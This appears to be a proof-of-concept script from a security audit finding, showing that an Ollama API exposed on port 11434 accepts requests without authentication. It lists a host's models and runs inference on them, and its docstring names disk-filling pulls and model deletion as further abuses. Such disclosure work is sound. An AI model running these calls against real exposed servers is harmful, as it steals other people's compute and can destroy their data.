"""
PoC — finding 004: unauthenticated Ollama API (exposed inference server).

Ollama's HTTP API on :11434 has NO authentication. By default it binds to
127.0.0.1 (localhost only), but it is routinely re-bound to 0.0.0.0 via
OLLAMA_HOST so other machines can reach it -- at which point ANY network
client can drive it with no password, token, or API key.

This PoC proves it in two beats, against a local instance:

  1. ENUMERATE   GET  /api/tags      -> list every model on the machine (recon)
  2. STEAL CPU   POST /api/generate  -> run a model on the victim's hardware

Notice: nowhere in this file is there a password, token, or key. That ABSENCE
is the whole vulnerability -- the door has no lock, so everyone can open it.

Two more abuses are NOT run here (they damage the host) but are one call away
for anyone who can reach the port:
  - POST   /api/pull    -> download arbitrary GBs of models -> fill the disk (DoS)
  - DELETE /api/delete  -> delete the victim's models       -> destruction

Setup:
  1. Ollama running (default): it already listens on :11434.
  2. py -3.11 poc.py
"""

import requests

# In the wild this is a host re-bound to 0.0.0.0 and reachable over the network.
# We test against localhost: the API and its (missing) auth are identical.
TARGET = "http://localhost:11434"


def enumerate_models():
    """Beat 1 -- recon. List every model on the box with no credentials."""
    r = requests.get(f"{TARGET}/api/tags")            # no auth sent
    models = [m["name"] for m in r.json()["models"]]
    print(f"[ENUMERATE] HTTP {r.status_code}, no password asked -> "
          f"{len(models)} models exposed:")
    for name in models:
        print(f"   - {name}")
    return models


def steal_compute(model):
    """Beat 2 -- compute theft. Make the victim's hardware run inference."""
    r = requests.post(f"{TARGET}/api/generate", json={  # no auth sent
        "model": model,
        "prompt": "Say hello in exactly one word.",     # content is irrelevant
        "stream": False,
    })
    answer = r.json()["response"]
    print(f"\n[STEAL COMPUTE] HTTP {r.status_code}, no key sent -> ran '{model}' "
          f"on the victim's hardware and got back: {answer!r}")
    print("    The prompt is innocent on purpose: the loot is the CPU time, "
          "not the text.")


if __name__ == "__main__":
    models = enumerate_models()
    if models:
        steal_compute(models[-1])   # attacker picks whatever is installed
